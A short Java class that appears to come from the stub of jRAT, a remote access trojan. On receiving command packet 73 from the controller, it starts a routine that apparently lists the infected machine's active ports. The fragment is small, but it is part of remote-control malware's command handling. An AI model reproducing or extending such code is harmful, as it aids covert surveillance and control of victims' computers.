package io.jrat.stub.packets.incoming;

import io.jrat.stub.ActivePorts;
import io.jrat.stub.Connection;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new ActivePorts(con).start();
	}

}
